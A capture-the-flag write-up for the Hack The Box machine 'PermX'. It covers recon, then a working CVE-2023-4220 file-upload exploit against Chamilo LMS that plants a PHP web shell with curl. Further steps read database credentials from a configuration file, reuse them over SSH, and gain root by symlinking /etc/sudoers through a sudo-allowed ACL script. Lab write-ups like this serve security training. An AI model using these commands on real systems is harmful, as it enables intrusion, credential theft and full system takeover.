# PermX-HTB-Writeup

## 

### Initial Nmap Scan
We begin by scanning the target machine using Nmap to identify open ports and services.

```bash
nmap -sC -sV -Pn -v 10.10.11.23
```
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://permx.htb
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Update Hosts File
To access the web application, we need to add the discovered subdomain to our hosts file.

```bash
sudo nano /etc/hosts 
```

### Visit the Web Application
Access the web application by navigating to `http://permx.htb` in your browser.

![Web Application](https://github.com/Milamagof/PermX-HTB-writeup/blob/fd87ecf5fc22f26189997e20e4e82a033bd6bfdb/Screenshot_2024-07-07_11_57_41.png)

### Directory Search
Perform a directory search to find hidden files and directories on the web server.

```bash
dirsearch -u http://permx.htb/ -x 403,404,400
```
```bash
[04:28:32] Starting:                                                             
[04:28:35] 301 -  303B  - /js  ->  http://permx.htb/js/                     
[04:28:44] 200 -    3KB - /404.html                                         
[04:28:46] 200 -    4KB - /about.html                                       
[04:29:11] 200 -    3KB - /contact.html                                     
[04:29:12] 301 -  304B  - /css  ->  http://permx.htb/css/                   
[04:29:24] 301 -  304B  - /img  ->  http://permx.htb/img/                   
[04:29:26] 200 -  448B  - /js/                                              
[04:29:28] 200 -  491B  - /lib/                                             
[04:29:28] 301 -  304B  - /lib  ->  http://permx.htb/lib/
[04:29:29] 200 -  649B  - /LICENSE.txt
```

### Subdomain Enumeration
Discover subdomains associated with the target domain using Wfuzz.

```bash
wfuzz -c --hc 400,404 -t 200 --hl 9 -w subdomains-top1million-110000.txt -u http://permx.htb -H "Host: FUZZ.permx.htb"
```
```bash
000000001:   200        586 L    2466 W     36182 Ch    "www"           
000000477:   200        352 L    940 W      19347 Ch    "lms"
```

![Subdomain](https://github.com/Milamagof/PermX-HTB-writeup/blob/fd87ecf5fc22f26189997e20e4e82a033bd6bfdb/Screenshot_2024-07-07_04_35_32.png)

### Directory Fuzzing on Subdomain
Perform directory fuzzing on the discovered subdomain to find additional hidden paths.

```bash
wfuzz -c --hc 400,404 -t 200  -w subdomains-top1million-110000.txt -u http://lms.permx.htb/FUZZ
```
```bash
000000328:   301        9 L      28 W       313 Ch      "main"                     
000000111:   301        9 L      28 W       312 Ch      "app"                      
000003062:   301        9 L      28 W       312 Ch      "src"                      
000002832:   301        9 L      28 W       322 Ch      "documentation"            
000009532:   200        352 L    940 W      19347 Ch    "#www"                     
000009838:   301        9 L      28 W       312 Ch      "bin"                      
000010581:   200        352 L    940 W      19347 Ch    "#mail"                    
000006335:   301        9 L      28 W       315 Ch      "plugin"                   
000002329:   301        9 L      28 W       315 Ch      "vendor"                   
000000044:   301        9 L      28 W       312 Ch      "web"                      
000047706:   200        352 L    940 W      19347 Ch    "#smtp"                    
000103135:   200        352 L    940 W      19347 Ch    "#pop3"
```

### Directory Enumeration with Gobuster
Run Gobuster to further enumerate directories on the subdomain.

```bash
gobuster dir -u http://lms.permx.htb/ -w /usr/share/wordlists/dirb/common.txt
```
```bash

/app                  (Status: 301) [Size: 312] [--> http://lms.permx.htb/app/]
/bin                  (Status: 301) [Size: 312] [--> http://lms.permx.htb/bin/]
/certificates         (Status: 301) [Size: 321] [--> http://lms.permx.htb/certificates/]
/documentation        (Status: 301) [Size: 322] [--> http://lms.permx.htb/documentation/]
/index.php            (Status: 200) [Size: 19356]
/main                 (Status: 301) [Size: 313] [--> http://lms.permx.htb/main/]
/plugin               (Status: 301) [Size: 315] [--> http://lms.permx.htb/plugin/]
/src                  (Status: 301) [Size: 312] [--> http://lms.permx.htb/src/]
/vendor               (Status: 301) [Size: 315] [--> http://lms.permx.htb/vendor/]
/web                  (Status: 301) [Size: 312] [--> http://lms.permx.htb/web/]
```

### Vulnerability Exploitation
Exploit a vulnerability to gain access to the system. In this case, we use [CVE-2023-4220](https://starlabs.sg/advisories/23/23-4220/) to upload a reverse shell.

Use [p0wny-shell](https://github.com/flozz/p0wny-shell) 

```bash
curl -F 'bigUploadFile=@/home/kali/HTB/permx/reverse_shell.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
```
![P0wny-shell](https://github.com/Milamagof/PermX-HTB-writeup/blob/fd87ecf5fc22f26189997e20e4e82a033bd6bfdb/Screenshot_2024-07-07_05_54_34.png)

### Extract Database Credentials
After gaining access, extract database credentials from the configuration file.

```bash
cat /var/www/chamilo/app/config/configuration.php
```
```bash
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6 *******bkW8';
```

### SSH Login
Use the extracted credentials to log in via SSH.

```bash
ssh mtz@10.10.11.23
pass: 03F6 *******bkW8
```

### Capture User Flag
Navigate to the user's home directory and capture the user flag.

```bash
mtz@permx:~$ ls
user.txt
mtz@permx:~$ cat user.txt
d914******************2d7f
```

### Privilege Escalation
Check sudo privileges and exploit them to escalate privileges to root.

```bash
mtz@permx:~$ sudo -l
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh
```

### Modify Sudoers File
Exploit the allowed script to gain write access to the sudoers file and grant full sudo privileges.

```bash
mtz@permx:~$ ln -s /etc/sudoers /home/mtz/sudoers
mtz

@permx:~$ sudo /opt/acl.sh mtz rwx /home/mtz/sudoers
mtz@permx:~$ nano /etc/sudoers
mtz@permx:~$ sudo su
root@permx:/home/mtz# 
```

### Capture Root Flag
Navigate to the root directory and capture the root flag.

```bash
root@permx:/home/mtz# sudo su
root@permx:/# cd /root
root@permx:~# ls
backup  reset.sh  root.txt
root@permx:~# cat root.txt
be9de*****************0e6c3c8d13

```






